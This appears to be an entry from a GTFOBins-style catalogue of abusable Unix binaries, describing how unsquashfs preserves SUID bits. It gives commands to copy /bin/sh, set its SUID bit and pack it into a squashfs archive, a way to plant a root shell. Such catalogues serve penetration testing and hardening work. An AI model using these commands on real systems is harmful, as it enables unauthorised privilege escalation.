        unsquashfs:
          comment: '`unsquashfs` preserve the SUID bit when extracting the file system. For example, prepare
            an archive beforehand with the following commands as root:


            ```

            cp /bin/sh .

            chmod +s sh

            mksquashfs sh shell

            ```'
